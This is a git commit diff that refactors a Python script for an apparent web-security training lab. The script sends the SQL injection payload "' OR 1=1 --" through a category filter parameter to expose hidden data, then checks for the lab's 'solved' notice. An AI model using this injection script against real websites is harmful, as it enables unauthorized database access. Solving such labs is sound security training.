1446cd90fb6af3b095e5178ff443400283ab108c
Alvin Nguyen <alvinonguyen00@gmail.com>
2023-12-12 22:49:39 -0800

    Refactor SQL Injection Lab 1 script

--- sql-injection/01-lab-retrieve-hidden-data.py
+++ sql-injection/01-lab-retrieve-hidden-data.py
@@ -1,5 +1,5 @@
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+from urllib.parse import urlencode, urljoin
 
 import argparse
 import requests
@@ -11,31 +11,71 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("url")
-    parser.add_argument("-x", "--use-proxy", type=bool, default=False)
+    parser.add_argument("-x", "--use-proxy", action="store_true")
     return parser.parse_args()
 
 
-def main():
-    args = get_args()
-    url = urljoin(args.url, "/filter")
-    proxies = (
-        None
-        if not args.use_proxy
-        else {"http": "http://localhost:8080", "https": "http://localhost:8080"}
-    )
+def print_info(string):
+    print(f"\033[1;94m[*]\033[00m {string}")
 
+
+def print_success(string):
+    print(f"\033[1;92m[+]\033[00m {string}")
+
+
+def print_fail(string):
+    print(f"\033[1;91m[-]\033[00m {string}")
+
+
+def verify_lab_accessible(url):
+    print_info("Checking if given URL is accessible...")
+    resp = requests.get(url)
+    if resp.status_code != 504:
+        print_success("URL is accessible.\n")
+    else:
+        print_fail("URL is inaccessible. Reopen the lab and use new URL.")
+        exit(1)
+
+
+def verify_lab_solved(url):
+    print_info("Revisiting URL to verify if attack was successful...")
+    resp = requests.get(url)
+    soup = BeautifulSoup(resp.text, "html.parser")
+    if soup.select_one("#notification-labsolved"):
+        print_success("Attack successful. Lab solved.")
+    else:
+        print_fail("Lab unsolved. Ensure...")
+        exit(1)
+
+
+def solve_lab(url, proxies):
+    url = urljoin(url, "/filter")
+    params = {"category": "' OR 1=1 --"}
+    print_info(
+        f'Performing SQL injection attack by visiting "{url}?{urlencode(params)}"'
+    )
     requests.get(
         url,
         params={"category": "' OR 1=1 --"},
         proxies=proxies,
         verify=False,
     )
+    print_success("SQL injection attack performed.\n")
 
-    print("SQL injection attack performed. Visiting URL to confirm lab is solved...")
 
-    resp = requests.get(url)
-    soup = BeautifulSoup(resp.text, "html.parser")
-    print(soup.select_one("#notification-labsolved h4").text)
+def main():
+    args = get_args()
+    root_url = urljoin(args.url, "/")
+
+    verify_lab_accessible(root_url)
+
+    proxies = None
+    if args.use_proxy:
+        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
+        print_info('Using "http://127.0.0.1:8080" as a proxy')
+
+    solve_lab(root_url, proxies)
+    verify_lab_solved(root_url)
 
 
 if __name__ == "__main__":
